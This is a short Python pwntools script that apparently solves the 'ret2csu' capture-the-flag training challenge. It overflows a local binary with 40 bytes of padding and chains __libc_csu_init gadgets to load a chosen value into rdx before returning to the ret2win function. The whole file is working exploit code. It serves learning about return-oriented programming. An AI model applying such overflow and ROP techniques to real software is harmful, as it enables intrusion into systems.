from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64',log_level='error')
# p = gdb.debug('./ret2csu','b *0x004007af')
p = process('./ret2csu')
chall = ELF('./ret2csu')

padding = b'a'*40
ret2win = p64(chall.symbols[b'ret2win'])
system = p64(chall.got[b'system'])
init = p64(0x600e38)
pop_rbx_rbp_r12_r13_r14_r15 = p64(0x0040089a)
mov_rdx_r15_call_r12 = p64(0x00400880)
pop_rdi = p64(0x004008a3)
call_r12 = p64(0x00400889)
val = p64(0xdeadcafebabebeef)
random_str = p64(0x004008e1)
zero = p64(0)
one = p64(1)

payload = padding
payload += pop_rbx_rbp_r12_r13_r14_r15
payload += zero + one + init + random_str + zero + val
payload += mov_rdx_r15_call_r12
payload += one*7
payload += ret2win

p.sendline(payload)
p.recvuntil('beef\n\n')
print(p.recvall().decode())
